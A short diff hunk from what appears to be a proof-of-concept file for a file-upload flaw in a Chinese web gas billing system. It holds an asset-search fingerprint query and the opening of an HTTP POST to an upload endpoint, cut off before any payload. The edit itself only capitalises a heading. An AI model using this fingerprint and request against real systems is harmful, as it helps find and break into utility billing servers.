@@ -5,7 +5,7 @@
 app="先锋WEB燃气收费系统"
 ```
 
-## poc
+## POC
 ```
 POST /AjaxService/Upload.aspx HTTP/1.1
 Host: target
